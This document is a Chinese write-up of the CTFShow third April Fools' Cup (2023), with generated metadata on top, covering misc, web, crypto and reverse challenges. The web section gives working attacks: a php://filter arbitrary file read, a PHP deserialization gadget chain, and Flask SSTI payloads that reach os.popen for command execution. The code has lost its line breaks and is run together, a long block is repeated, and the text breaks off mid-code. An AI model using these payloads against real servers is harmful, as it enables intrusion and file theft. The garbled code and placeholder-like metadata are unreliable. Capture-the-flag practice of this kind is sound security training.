---
title: CTFSHOW 第三届愚人杯 WP
contest: CTFShow
year: 2023
difficulty: medium
vuln_type: web_unknown
tags:
- PNG CRC32反推宽高
- Ook语言
- PHP base64任意文件读
- 反序列化链 w_wuw_w+gBoBg
- Caesar字符移位
- Flask SSTI cycler
- RSA链式加密+IP尾
- s_box+encrypt1+encrypt2
- 矩阵异或+线性代数
- 异或递推
- PNG矩阵成图
attack_chain:
- 'Misc: PNG CRC32 反推 width/height (for w/h in 4096)'
- 'Ook 语言: !替换！, .替换。, ?替换？'
- 'Web PHP: ?img=base64(file) 任意文件读'
- '反序列化: w_wuw_w __destruct → gBoBg __toString → w_wuw_w __invoke → EeE __clone → cycycycy.aaa'
- Caesar 字符移位 4 + qwertyuiopasdfghjklzxcvbnm123456789
- 'Flask SSTI: g.pop.__globals__.__builtins__.__import__(''os'').popen(''ls'').read()'
- 'Crypto: RSA PKCS1_v1_5 链式加密 (密文1+IP2 → 密文2+IP3 → 明文+IP用户B)'
- 'encrypt1: 块内 16 字节 7 倍位置交换'
- 'encrypt2: S_BOX 置换 16 次'
- 'Reverse: 矩阵加密 (300*300 异或表) + 矩阵成图'
- flag 不在题面, 在加密矩阵本身
key_payload: '''PNG CRC32 反推 / Ook 语言 / PHP base64 任意文件读 / 反序列化 4 步链 / Caesar 移位 4 / Flask SSTI / RSA PKCS1 链式加密 / S_BOX 置换 / 300x300 矩阵异或 / 矩阵成图'''
one_liner: 'CTFSHOW 第三届愚人杯 — 12+ 题合集: PNG CRC32 反推 + Ook 语言 + PHP base64 任意文件读 + 反序列化 4 步链 + Caesar + Flask SSTI + RSA 链式 + S_BOX 置换 + 矩阵异或。'
lesson: 愚人杯风格是 1 道题多种 trick 混合;PNG CRC32 反推宽高是经典;反序列化 4 步链 (destruct → toString → invoke → clone) 是 PHP 模板;S_BOX 置换 + 16 轮 encrypt1 块内交换是常见加密。
quality: high
full_path: CTFSHOW第三届愚人杯WP.full.md
meta_path: CTFSHOW第三届愚人杯WP.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 'CTFSHOW 第三届愚人杯 WP。CTFSHOW 第三届愚人杯 — 12+ 题合集: PNG CRC32 反推 + Ook 语言 + PHP base64 任意文件读 + 反序列化 4 步链 + Caesar + Flask SSTI + RSA 链式 + S_BOX 置换 + 矩阵异或。。关键路径：Misc: PNG CRC32 反推 width/height (for w/h in 4...'
category: web
subcategory: web_other
tools_used:
- Flask
- PHP
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: practice
wp_url: https://www.ctfiot.com/121875.html
reasoning_chain:
- PNG CRC32 触发点：拿到 flag.png 但尺寸异常 → 假设：宽高被篡改导致 CRC 不匹配
- 动作：读 [12:29] IHDR 数据 + [29:33] CRC key → 观察：CRC key = 0xabcd1234
- 假设：宽高在 [16:20]+[20:24] 位置 → 动作：循环 w/h 0-4096 重算 CRC → 观察：匹配得 width=N1 height=N2 真实尺寸
- Ook 触发点：base64-like 字符但符号变体 → 动作：!→'!', .→'.', ?→'?' 全角转半角替换 → 观察：脑 Ook brainfuck 解码
- 假设：Web 题中 PHP base64 任意文件读 → 动作：?img=php://filter/convert.base64-encode/resource=check.php → 观察：拿到 check.php 源码
- 反序列化触发点：4 个 class w_wuw_w/gBoBg/EeE/cycycycy → 动作：构造 __destruct → __toString → __invoke → __clone → .aaa 链
- 假设：Caesar 字符移位 + 自定义字母表 → 动作：pos = (pos - 4 + len) mod len 自定义 qwertyuiopasdfghjklzxcvbnm123456789 → 观察：解码 flag
- Flask SSTI 触发点：'ge'/'f' 字符串黑名单检查但 __globals__ 仍可访问 → 动作：{{g.pop.__globals__.__builtins__['__import__']('os').popen('ls').read()}}
- RSA 链式 触发点：密文1+IP2 套密文2+IP3 套密文+IP4 → 假设：3 层 RSA 串联加密 → 动作：依次解 + 提 IP → 观察：还原明文
- 下一步：encrypt1 块内 7 倍位置交换 + encrypt2 S_BOX 16 轮置换 + 矩阵异或 300x300 → 动作：矩阵成图 → 观察：flag 在加密矩阵本身
failed_attempts:
- 反序列化直接 new w_wuw_w() 等调用 → 失败：链式触发必须 aaa=&$a->key 引用 + coos 嵌套
- SSTI 直接 {{config.__class__.__init__.__globals__['os'].popen('ls').read()}} → 失败：'ge' 关键字黑名单
- RSA 链式试图整体解密 → 失败：必须一层一层 PKCS1_v1_5 + 拆 IP
- 矩阵直接 readlines 解码 → 失败：必须按 300x300 reshape 成 numpy 矩阵后再异或
key_observations:
- PNG 头 IHDR 段格式固定，可爆破 w/h 反推 CRC
- PHP 反序列化 4 步链 (destruct → toString → invoke → clone) 是 RCE 模板
- Flask SSTI 字符黑名单不可全 - 字符串拼接 + __globals__ 仍可绕
- RSA PKCS1_v1_5 链式加密需要逐层解密 + 拆 IP 头拼接
- 300x300 矩阵异或 → 成图技巧是 misc/reverse 的常考点
prerequisites:
- PNG 文件结构 + IHDR 段格式
- PHP 反序列化魔术方法链 (destruct/toString/invoke/clone)
- Flask SSTI 沙箱逃逸（cycler/__globals__/builtins）
- RSA PKCS1_v1_5 + IP 头解析
- numpy 矩阵操作 + reshape + XOR 还原图像
---
# CTFSHOW第三届愚人杯WP

> 原文: https://www.ctfiot.com/121875.html
> ID: 121875

import structimport zlibimport struct

with open('flag.png','rb') as image_data: bin_data = image_data.read()data = bytearray(bin_data[12:29])print(bin_data[29:33].hex())crc32key = eval("0x" + bin_data[29:33].hex())n = 4096for w in range(n): width = bytearray(struct.pack('>i', w)) for h in range(n): height = bytearray(struct.pack('>i', h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = zlib.crc32(data) if crc32result == crc32key: print("width:%s height:%s" % (int(bytearray(width).hex(), 16), int(bytearray(height).hex(), 16))) exit()

s = ""for line in s.split("n"): print("Ook"+line[-1].replace("？", "?").replace("！", "!").replace("。", "."),end=" ")

<?php/*# -*- coding: utf-8 -*-# @Author: h1xa
# @Date: 2023-03-27 10:30:30
# @Last Modified by: h1xa
# @Last Modified time: 2023-03-28 12:15:33
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/
$image=$_GET['img'];
$flag = "ctfshow{b72d1934-d612-437f-bf7c-28a81ac03df4}";if(isset($image)){ $image = base64_decode($image); $data = base64_encode(file_get_contents($image)); echo "";}else{ $image = base64_encode("face.png"); header("location:/?img=".$image);}

$a = new w_wuw_w();$a->file = "php://filter/convert.base64-encode/resource=check.php";$a->aaa = &$a->key;
echo serialize($a);

function cipher($str) {
 if(strlen($str)>10000){ exit(-1); }
 $charset = "qwertyuiopasdfghjklzxcvbnm123456789"; $shift = 4; $shifted = "";
 for ($i = 0; $i < strlen($str); $i++) { $char = $str[$i]; $pos = strpos($charset, $char);
 if ($pos !== false) { $new_pos = ($pos - $shift + strlen($charset)) % strlen($charset); $shifted .= $charset[$new_pos]; } else { $shifted .= $char; } }
 return $shifted;}

<?php

class EeE{ public $text; public $eeee;
}
class cycycycy{ public $a;
}
class gBoBg{ public $name; public $file; public $coos;
}
class w_wuw_w{ public $aaa; public $key; public $file;
}
$a = new w_wuw_w();$g = new gBoBg();$g->file = ""; // 设置之后进入$aa = $this->coos;分支$g->coos = $a; // 触发w_wuw_w 的 __invoke$a->aaa = $g; // 触发gBoBg 的 __toStringecho serialize($a);
// 执行流程为w_wuw_w.__destruct -> gBoBg.__toString // -> w_wuw_w.__invoke -> EeE.__clone -> cycycycy.aaa ;

from flask import Flask
from flask import render_template_string,render_templateapp = Flask(__name__)
@app.route('/hello/')def hello(name=None): return render_template('hello.html',name=name)@app.route('/hello/<name>')def hellodear(name): if "ge" in name: return render_template_string('hello %s' % name) elif "f" not in name: return render_template_string('hello %s' % name) else: return 'Nonononon'

POC1:{{g.pop.__globals__.__builtins__['__import__']('os').popen('ls').read()}}POC2:{{application.__init__.__globals__.__builtins__['__import__']('os').popen('ls') .read()}}POC3:{{get_flashed_messages.__globals__.__builtins__['__import__']('os').popen('ls') .read()}}

if request.args.get('api', None) is not None: api = request.args.get('api') if re.search(r'^[d.:]+$', api): get = requests.get('http://'+api) html += '<!--'+get.text+'-->' return html

#(密文1)通过私钥1解密为(密文2+IP2)#(密文2)通过私钥2解密为(密文3+IP3)#(密文3)通过私钥3解密为(明文+IP用户B)def encrypt(plaintext, public_key): cipher = PKCS1_v1_5.new(RSA.importKey(public_key))
 ciphertext = '' for i in range(0, len(plaintext), 128):  ciphertext += cipher.encrypt(plaintext[i:i+128].encode('utf-8')).hex()
 return ciphertext

import requestsimport time
from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5
public_key1 = """-----BEGIN PUBLIC KEY-----。。。-----END PUBLIC KEY-----"""public_key2 = """-----BEGIN PUBLIC KEY-----。。。-----END PUBLIC KEY-----"""public_key3 = """-----BEGIN PUBLIC KEY-----。。。-----END PUBLIC KEY-----"""# 加密
def encrypt(plaintext, public_key): cipher = PKCS1_v1_5.new(RSA.importKey(public_key))
 ciphertext = '' for i in range(0, len(plaintext), 128): ciphertext += cipher.encrypt(plaintext[i:i+128].encode('utf-8')).hex()
 return ciphertext
def decrypt(ciphertext, private_key): cipher = PKCS1_v1_5.new(RSA.importKey(private_key)) plaintext = '' for i in range(0, len(ciphertext), 512): # print(plaintext) plaintext += cipher.decrypt(bytes.fromhex(ciphertext[i:i+512]), None). decode('utf-8') return plaintext

URL = "http://297eacba-1b13-4bdf-b23a-5e32b788c721.challenge.ctf.show/"msg = requests.get(URL + "/update").content.decode()data = msg.split("@")
key = RSA.import_key(data[0].replace("\n", "n"))
myip = "2.56.12.89"data1 = decrypt(data[1], key.export_key())msg = data1[:-10]ip = data1[-10:]print("当前收到的信息:", msg, "下一个节点IP:", ip)print("_______________________________________")
# print(decrypt(data1, key.export_key()))
# 我是第一个节点#最后一层是节点三next_node_ip = encrypt(myip, public_key3.replace("\n", "n"))#我的下一个节点是节点二next_node_ip = encrypt(next_node_ip, public_key2.replace("\n", "n"))
print(len(next_node_ip))
payload = { "message" : msg[:-2560] + next_node_ip + msg[-512:] + ip}print(len(msg[:-2560] + next_node_ip + msg[-512:] + ip))res = requests.post(URL + "/pass_message", data=payload) # 传递给下一个节点if res.status_code == 200: print("success")
msg = requests.get(URL + "/update").content.decode() # 等待后续节点返回信息给自己data = msg.split("@")print(data[1])

# app.py
from flask import Flask, render_template, request, redirect, url_for, session, send_file, Responseapp = Flask(__name__)
app.secret_key = 'S3cr3tK3y'
......

4C455A5645334C44474A55484D5A42544F5132574956525A50464E464F4E4C474D4656454D334359474A554751564B4949493255535532464E42544643504A35

from Crypto.Util.number import *from flag import flagfrom Crypto.Util.Padding import pad
from random import *def s_box(a): box=[i for i in range(a)] shuffle(box) return boxBLOCK=16flag=pad(flag,BLOCK)S_BOX=s_box(len(flag))m=[i for i in flag]def swap(a,b): tmp = a a = b b = tmp
def encrypt1(m): enc=[m[i:i+BLOCK] for i in range(0,len(m),BLOCK)] for i in enc: for j in range(BLOCK): aa=j*7%BLOCK swap(i[j],i[aa])def encrypt2(m): for i in range(16): m=[m[i] for i in S_BOX] return mencrypt1(m)c=encrypt2(m)print(S_BOX)print(c)'''[9, 31, 32, 38, 20, 1, 22, 4, 8, 2, 11, 21, 7, 18, 46, 23, 34, 3, 19, 12, 45, 30, 27, 37, 5, 47, 28, 36, 0, 43, 39, 10, 29, 14, 40, 24, 33, 16, 17, 6, 42, 15, 26, 41, 44, 25, 35, 13][99, 111, 102, 11, 107, 49, 11, 53, 121, 48, 114, 117, 11, 95, 112, 95, 109, 115, 11, 95, 101, 95, 119, 117, 79, 123, 111, 48, 110, 95, 121, 116, 121, 125, 116, 11, 119, 11, 97, 67, 11, 11, 11, 11, 11, 99, 110, 104]'''

from Crypto.Util.Padding import unpad
def swap(a, b): tmp = a a = b b = tmp

def inv_s_box(s_box): inv_s_box = [0]*len(s_box) for i in range(len(s_box)): inv_s_box[s_box[i]] = i return inv_s_box
def inv_encrypt1(m): dec = [m[i:i+BLOCK] for i in range(0, len(m), BLOCK)] for i in dec: for j in range(BLOCK): aa = j*7 % BLOCK swap(i[j], i[aa])
def inv_encrypt2(m, inv_s_box): for i in range(16): m = [m[inv_s_box[i]] for i in range(len(m))] return m
BLOCK = 16c = [99, 111, 102, 11, 107, 49, 11, 53, 121, 48, 114, 117, 11, 95, 112, 95, 109, 115, 11, 95, 101, 95, 119, 117, 79, 123, 111, 48, 110, 95, 121, 116, 121, 125, 116, 11, 119, 11, 97, 67, 11, 11, 11, 11, 11, 99, 110, 104]
S_BOX = [9, 31, 32, 38, 20, 1, 22, 4, 8, 2, 11, 21, 7, 18, 46, 23, 34, 3, 19, 12, 45, 30, 27, 37, 5, 47, 28, 36, 0, 43, 39, 10, 29, 14, 40, 24, 33, 16, 17, 6, 42, 15, 26, 41, 44, 25, 35, 13]

inv_sbox = inv_s_box(S_BOX)m = list(c)m = inv_encrypt2(m, inv_sbox)inv_encrypt1(m)m = unpad(bytes(m), BLOCK)print(bytes(m))

print 'Welcome to CTFshow Re!'print 'your flag is here!'flag = ''l = len(flag)for i in range(l): num = ((flag[i] + i) % 114514 + 114514) % 114514 code += chr(num)
code = map(ord, code)for i in range(l - 4 + 1): code[i] = code[i] ^ code[(i + 1)]
print codecode = ['x16', 'x1d', 'x1e', 'x1a', 'x18', 't', 'xff', 'xd0', ',', 'x03', 'x02', 'x14', '8', 'm', 'x01', 'C', 'D', 'xbd', 'xf7', '*', 'r', 'xda', 'xf9', 'x1c', '&', '5', "'", 'xda', 'xd4', 'xd1', 'x0b', 'xc7', 'xc7', 'x1a', 'x90', 'D', 'xa1']

code = ['x16', 'x1d', 'x1e', 'x1a', 'x18', 't', 'xff', 'xd0', ',', 'x03', 'x02', 'x14', '8', 'm', 'x01', 'C', 'D', 'xbd', 'xf7', '*', 'r', 'xda', 'xf9', 'x1c', '&', '5', "'", 'xda', 'xd4', 'xd1', 'x0b', 'xc7', 'xc7', 'x1a', 'x90', 'D', 'xa1']
code = list(map(ord, code))for i in range(len(code) - 4 + 1, 0, -1): code[i-1] = code[i] ^ code[i-1]# print(code)for i in range(len(code)): for ch in range(32, 128): if ((ch + i) % 114514 + 114514) % 114514 == code[i]: print(chr(ch), end='') break

sub_401460();// 提示输入明文sub_401700(v12);//输入sub_401460();//提示输入两个数字std::
istream::
operator>>(std::
cin, &v10);std::
istream::
operator>>(std::
cin, &v11);v3 = v10 % 299;v4 = v11 % 299;v5 = 0;v9 = v11 % 299;v6 = strlen(v12);if ( v6 ){ do { v8 = dword_403AA0[300 * v3 + v4] ^ v12[v5]; // 在300*300的表中查找索引并 v3 = (v8 + v3) % 299; // 对明文异或 v9 = (v8 + v9) % 300; std::
ostream::
operator<<(std::
cout, v8); sub_401460(); // 输出当前密文 v4 = v9; ++v5; } while ( v5 < v6 );}sub_401460(); // 输出提示信息以及一大堆密文return 0;

datas = []
enc = [90,171,198,235,229,43,246,92,198,203,233,228,6,128,215,68,201,4,220,214,169,245,208,199,112,170,119,251,244,58,237,4,70,231,200,45,186,137,247,225,243,13,145,139,190,146,194,242,253,56,239,5,41,225,105,51,247,79,170,231,88,64,224,138,222,220,229,88,43,117,236,189,228,205,150,65,26,205,232,141,116,149,185,89,212,251,16,215,205,17,238,22,245,77,220,198,224,248,223,209,205,167,223,210,165,247,190,3,5,246,243,228,181,33,42,207,174,138,244,118,192,22,219,60,80,229,144,219,133,211,221,229,190,58,151,240,183,207,221,60,77,217,220,74,105,220,221,165,85,174,43,183,188,190,252,255,130,137,189,201,239,181,150,143,214,203,26,211,103,222,105,87,214,179,83,185,104,206,229,172,221,117,163,57,106,200,46,165,193,135,243,166,168,209,144,52,210,12,58,10,103,5,211,55,172,76,88,250,136,245,167,139,241,26,92,97,139,241,137,27,53,211,251,191,240,173,14,231,241,242,255,122,144,97,234,36,175,155,253,35,156,229,19,166,191,140,195,218,130,35,200,178,245,41,162,243,214,222,87,83,195,144,55,159,208,241,193,233,204,228,196,105,84,58,220,226,1,47,248,138,177,124,236,53,210,79,250,106,27,244,251,203,210,103,213,218,183,4,40,28,12,175,52,224,203,89,176,174,175,233,43,20,103,152,201,4,148,76,241,103,135,139,136,246,80,184,255,194,149,239,206,207,246,166,20,63,202,199,177,214,60,99,74,211,219,94,247,193,40,212,197,175,30,244,41,24,113,27,249,213,225,55,188,193,165,220,174,252,105,154,74,126,174,255,110,169,103,44,246,255,98,251,211,87,171,62,67,250,69,149,18,77,159,137,168,231,187,97,174,115,243,44,128,151,90,246,83,11,138,67,184,22,53,228,230,252,76,112,20,136,131,90,233,248,67,207,61,212,113,62,239,203,201,66,83,179,16,209,253,63,206,208,101,150,196,145,101,220,22,79,241,69,237,219,97,87,20,22,240,244,218,7,237,42,14,8,38,115,141,102,206,191,142,55,196,200,142,98,16,129,53,52,50,197,53,219,2,66,152,192,245,243,69,26,132,240,164,90,246,200,53,89,221,119,139,76,47,132,53,47,249,26,53,141,113,69,76,152,121,193,53,176,97,135,205,206,237,108,251,38,216,108,12,220,209,194,26,243,217,231,36,117,235,106,205,43,254,75,209,141,239,200,5,183,219,166,113,9,16,154,116,144,238,208,245,136,173,16,103,107,114,17,208,181,196,98,212,133,211,252]
with open("/Users/linkle/Downloads/re1.exe", "rb") as f: exe = f.read() bins = exe[0x28A0:
0x5A6E0] for xx in range(0, len(bins), 4): datas.append(ord(bins[xx: xx+1]))
for n1 in range(300): for n2 in range(300): for ch in range(32, 128): if 300 * n1 + n2 >= len(datas): continue # print(300 * n1 + n2) if datas[300 * n1 + n2] ^ ch == enc[0]: flag = 0 n1_r = n1 n2_r = n2 for i in range(1, 32): n1_r = (enc[i-1] + n1_r) % 299 n2_r = (enc[i-1] + n2_r) % 300
 try: for ch2 in range(32, 128): if datas[300 * n1_r + n2_r] ^ ch2 == enc[i]: flag += 1 break 
except: continue if flag >= 31: print(n1, n2, ch) # 对得上大部分密文的话估计就是正确数字了

flag不在这里呦,就像生活，你跨过了人山人海，你跨过了明月清风，你见过了三更灯火，你见过了黎明的城市。
你觉得你已经足够努力，你觉得你理应破浪乘风。你满身疲惫你筋疲力竭
可惜，罗马不在前方。或者，罗马永远在前方，在别人出生的地方。
本狸，强烈建议你回到最初的地方好好研究下加密矩阵有惊喜哦

with open("/Users/linkle/Downloads/re1.exe", "rb") as f: exe = f.read() bins = exe[0x28A0:
0x5A6E0] for xx in range(0, len(bins), 4): datas.append(ord(bins[xx: xx+1]))
from PIL import Image
newimg = Image.new('RGB',(300, 300))for i in range(300): for j in range(300): newimg.putpixel((i, j), (datas[300 * i + j], 0, 0))newimg.save('flag.png')

strcpy(keys, "key123");printf((char *)&Format, v16[0]);v4 = _acrt_iob_func(0);fgets(Buffer, 100, v4);v5 = strcspn(Buffer, "n");if ( v5 >= 0x64 ) goto LABEL_16;v15 = v3;Buffer[v5] = 0;index = 0;v7 = strlen(Buffer);if ( v7 ){ len_keys = strlen(keys); do { v17[index] = Buffer[index] ^ keys[index % len_keys]; ++index; } while ( index < v7 ); if ( index >= 0xC9 ) goto LABEL_16;}v17[index] = 0;v9 = 0;v10 = strlen(v17);if ( v10 ){ v11 = v16; do { sprintf(v11, "%02x", v17[v9++]); v11 += 2; } while ( v9 < v10 );}v12 = 2 * v9;if ( v12 >= 0xC9 ){LABEL_16: __report_rangecheckfailure(v15); __debugbreak();}v16[v12] = 0;printf("n", v15);v13 = strcmp(v16, "08111f425a5c1c1e1a526d410e3a1e5e5d573402165e561216");if ( v13 ) v13 = v13 < 0 ? -1 : 1;if ( v13 ) printf("flag is false: ", v16[0]);else printf("flag is true: ", v16[0]);system("pause");

key = "key123"s = "08111f425a5c1c1e1a526d410e3a1e5e5d573402165e561216"for i in range(0, len(s), 2): print(chr(int(s[i:i+2], 16) ^ ord(key[i//2 % len(key)])), end="")

f = open("/Users/linkle/Downloads/babyre", "rb").read()datas = []for ch in f[0x1524:
0x153C]: datas.append(ch)
def enc(s): len_s = len(s) for i in range(len_s): t = 0 for j in range(len_s): t += s[j] s[i] = t & 0xff return s
def dec(s): len_s = len(s) for i in range(len_s - 1, -1, -1): for c in range(0xff): # print(s[:i]+s[i+1:]) if sum(s[:i]+s[i+1:]+[c]) & 0xff == s[i]: s[i] = c # print(c) break # break return sprint("".join(list(map(chr, dec(datas.copy())))))

免责声明

由于传播、利用本公众号渗透测试网络安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号渗透测试网络安全及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！

好文分享收藏赞一下最美点在看哦


```
import structimport zlibimport struct

with open('flag.png','rb') as image_data: bin_data = image_data.read()data = bytearray(bin_data[12:29])print(bin_data[29:33].hex())crc32key = eval("0x" + bin_data[29:33].hex())n = 4096for w in range(n): width = bytearray(struct.pack('>i', w)) for h in range(n): height = bytearray(struct.pack('>i', h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = zlib.crc32(data) if crc32result == crc32key: print("width:%s height:%s" % (int(bytearray(width).hex(), 16), int(bytearray(height).hex(), 16))) exit()
s = ""for line in s.split("n"): print("Ook"+line[-1].replace("？", "?").replace("！", "!").replace("。", "."),end=" ")
<?php/*# -*- coding: utf-8 -*-# @Author: h1xa
# @Date: 2023-03-27 10:30:30
# @Last Modified by: h1xa
# @Last Modified time: 2023-03-28 12:15:33
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/
$image=$_GET['img'];
$flag = "ctfshow{b72d1934-d612-437f-bf7c-28a81ac03df4}";if(isset($image)){ $image = base64_decode($image); $data = base64_encode(file_get_contents($image)); echo "";}else{ $image = base64_encode("face.png"); header("location:/?img=".$image);}
$a = new w_wuw_w();$a->file = "php://filter/convert.base64-encode/resource=check.php";$a->aaa = &$a->key;
echo serialize($a);
function cipher($str) {
 if(strlen($str)>10000){ exit(-1); }
 $charset = "qwertyuiopasdfghjklzxcvbnm123456789"; $shift = 4; $shifted = "";
 for ($i = 0; $i < strlen($str); $i++) { $char = $str[$i]; $pos = strpos($charset, $char);
 if ($pos !== false) { $new_pos = ($pos - $shift + strlen($charset)) % strlen($charset); $shifted .= $charset[$new_pos]; } else { $shifted .= $char; } }
 return $shifted;}
<?php

class EeE{ public $text; public $eeee;
}
class cycycycy{ public $a;
}
class gBoBg{ public $name; public $file; public $coos;
}
class w_wuw_w{ public $aaa; public $key; public $file;
}
$a = new w_wuw_w();$g = new gBoBg();$g->file = ""; // 设置之后进入$aa = $this->coos;分支$g->coos = $a; // 触发w_wuw_w 的 __invoke$a->aaa = $g; // 触发gBoBg 的 __toStringecho serialize($a);
// 执行流程为w_wuw_w.__destruct -> gBoBg.__toString // -> w_wuw_w.__invoke -> EeE.__clone -> cycycycy.aaa ;
from flask import Flask
from flask import render_template_string,render_templateapp = Flask(__name__)
@app.route('/hello/')def hello(name=None): return render_template('hello.html',name=name)@app.route('/hello/<name>')def hellodear(name): if "ge" in name: return render_template_string('hello %s' % name) elif "f" not in name: return render_template_string('hello %s' % name) else: return 'Nonononon'
POC1:{{g.pop.__globals__.__builtins__['__import__']('os').popen('ls').read()}}POC2:{{application.__init__.__globals__.__builtins__['__import__']('os').popen('ls') .read()}}POC3:{{get_flashed_messages.__globals__.__builtins__['__import__']('os').popen('ls') .read()}}
if request.args.get('api', None) is not None: api = request.args.get('api') if re.search(r'^[d.:]+$', api): get = requests.get('http://'+api) html += '<!--'+get.text+'-->' return html
#(密文1)通过私钥1解密为(密文2+IP2)#(密文2)通过私钥2解密为(密文3+IP3)#(密文3)通过私钥3解密为(明文+IP用户B)def encrypt(plaintext, public_key): cipher = PKCS1_v1_5.new(RSA.importKey(public_key))
 ciphertext = '' for i in range(0, len(plaintext), 128):  ciphertext += cipher.encrypt(plaintext[i:i+128].encode('utf-8')).hex()
 return ciphertext
import requestsimport time
from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5
public_key1 = """-----BEGIN PUBLIC KEY-----。。。-----END PUBLIC KEY-----"""public_key2 = """-----BEGIN PUBLIC KEY-----。。。-----END PUBLIC KEY-----"""public_key3 = """-----BEGIN PUBLIC KEY-----。。。-----END PUBLIC KEY-----"""# 加密
def encrypt(plaintext, public_key): cipher = PKCS1_v1_5.new(RSA.importKey(public_key))
 ciphertext = '' for i in range(0, len(plaintext), 128): ciphertext += cipher.encrypt(plaintext[i:i+128].encode('utf-8')).hex()
 return ciphertext
def decrypt(ciphertext, private_key): cipher = PKCS1_v1_5.new(RSA.importKey(private_key)) plaintext = '' for i in range(0, len(ciphertext), 512): # print(plaintext) plaintext += cipher.decrypt(bytes.fromhex(ciphertext[i:i+512]), None). decode('utf-8') return plaintext

URL = "http://297eacba-1b13-4bdf-b23a-5e32b788c721.challenge.ctf.show/"msg = requests.get(URL + "/update").content.decode()data = msg.split("@")
key = RSA.import_key(data[0].replace("\n", "n"))
myip = "2.56.12.89"data1 = decrypt(data[1], key.export_key())msg = data1[:-10]ip = data1[-10:]print("当前收到的信息:", msg, "下一个节点IP:", ip)print("_______________________________________")
# print(decrypt(data1, key.export_key()))
# 我是第一个节点#最后一层是节点三next_node_ip = encrypt(myip, public_key3.replace("\n", "n"))#我的下一个节点是节点二next_node_ip = encrypt(next_node_ip, public_key2.replace("\n", "n"))
print(len(next_node_ip))
payload = { "message" : msg[:-2560] + next_node_ip + msg[-512:] + ip}print(len(msg[:-2560] + next_node_ip + msg[-512:] + ip))res = requests.post(URL + "/pass_message", data=payload) # 传递给下一个节点if res.status_code == 200: print("success")
msg = requests.get(URL + "/update").content.decode() # 等待后续节点返回信息给自己data = msg.split("@")print(data[1])
# app.py
from flask import Flask, render_template, request, redirect, url_for, session, send_file, Responseapp = Flask(__name__)
app.secret_key = 'S3cr3tK3y'
......
4C455A5645334C44474A55484D5A42544F5132574956525A50464E464F4E4C474D4656454D334359474A554751564B4949493255535532464E42544643504A35
from Crypto.Util.number import *from flag import flagfrom Crypto.Util.Padding import pad
from random import *def s_box(a): box=[i for i in range(a)] shuffle(box) return boxBLOCK=16flag=pad(flag,BLOCK)S_BOX=s_box(len(flag))m=[i for i in flag]def swap(a,b): tmp = a a = b b = tmp
def encrypt1(m): enc=[m[i:i+BLOCK] for i in range(0,len(m),BLOCK)] for i in enc: for j in range(BLOCK): aa=j*7%BLOCK swap(i[j],i[aa])def encrypt2(m): for i in range(16): m=[m[i] for i in S_BOX] return mencrypt1(m)c=encrypt2(m)print(S_BOX)print(c)'''[9, 31, 32, 38, 20, 1, 22, 4, 8, 2, 11, 21, 7, 18, 46, 23, 34, 3, 19, 12, 45, 30, 27, 37, 5, 47, 28, 36, 0, 43, 39, 10, 29, 14, 40, 24, 33, 16, 17, 6, 42, 15, 26, 41, 44, 25, 35, 13][99, 111, 102, 11, 107, 49, 11, 53, 121, 48, 114, 117, 11, 95, 112, 95, 109, 115, 11, 95, 101, 95, 119, 117, 79, 123, 111, 48, 110, 95, 121, 116, 121, 125, 116, 11, 119, 11, 97, 67, 11, 11, 11, 11, 11, 99, 110, 104]'''
from Crypto.Util.Padding import unpad
def swap(a, b): tmp = a a = b b = tmp

def inv_s_box(s_box): inv_s_box = [0]*len(s_box) for i in range(len(s_box)): inv_s_box[s_box[i]] = i return inv_s_box
def inv_encrypt1(m): dec = [m[i:i+BLOCK] for i in range(0, len(m), BLOCK)] for i in dec: for j in range(BLOCK): aa = j*7 % BLOCK swap(i[j], i[aa])
def inv_encrypt2(m, inv_s_box): for i in range(16): m = [m[inv_s_box[i]] for i in range(len(m))] return m
BLOCK = 16c = [99, 111, 102, 11, 107, 49, 11, 53, 121, 48, 114, 117, 11, 95, 112, 95, 109, 115, 11, 95, 101, 95, 119, 117, 79, 123, 111, 48, 110, 95, 121, 116, 121, 125, 116, 11, 119, 11, 97, 67, 11, 11, 11, 11, 11, 99, 110, 104]
S_BOX = [9, 31, 32, 38, 20, 1, 22, 4, 8, 2, 11, 21, 7, 18, 46, 23, 34, 3, 19, 12, 45, 30, 27, 37, 5, 47, 28, 36, 0, 43, 39, 10, 29, 14, 40, 24, 33, 16, 17, 6, 42, 15, 26, 41, 44, 25, 35, 13]

inv_sbox = inv_s_box(S_BOX)m = list(c)m = inv_encrypt2(m, inv_sbox)inv_encrypt1(m)m = unpad(bytes(m), BLOCK)print(bytes(m))
print 'Welcome to CTFshow Re!'print 'your flag is here!'flag = ''l = len(flag)for i in range(l): num = ((flag[i] + i) % 114514 + 114514) % 114514 code += chr(num)
code = map(ord, code)for i in range(l - 4 + 1): code[i] = code[i] ^ code[(i + 1)]
print codecode = ['x16', 'x1d', 'x1e', 'x1a', 'x18', 't', 'xff', 'xd0', ',', 'x03', 'x02', 'x14', '8', 'm', 'x01', 'C', 'D', 'xbd', 'xf7', '*', 'r', 'xda', 'xf9', 'x1c', '&', '5', "'", 'xda', 'xd4', 'xd1', 'x0b', 'xc7', 'xc7', 'x1a', 'x90', 'D', 'xa1']
code = ['x16', 'x1d', 'x1e', 'x1a', 'x18', 't', 'xff', 'xd0', ',', 'x03', 'x02', 'x14', '8', 'm', 'x01', 'C', 'D', 'xbd', 'xf7', '*', 'r', 'xda', 'xf9', 'x1c', '&', '5', "'", 'xda', 'xd4', 'xd1', 'x0b', 'xc7', 'xc7', 'x1a', 'x90', 'D', 'xa1']
code = list(map(ord, code))for i in range(len(code) - 4 + 1, 0, -1): code[i-1] = code[i] ^ code[i-1]# print(code)for i in range(len(code)): for ch in range(32, 128): if ((ch + i) % 114514 + 114514) % 114514 == code[i]: print(chr(ch), end='') break
sub_401460();// 提示输入明文sub_401700(v12);//输入sub_401460();//提示输入两个数字std::
istream::
operator>>(std::
cin, &v10);std::
istream::
operator>>(std::
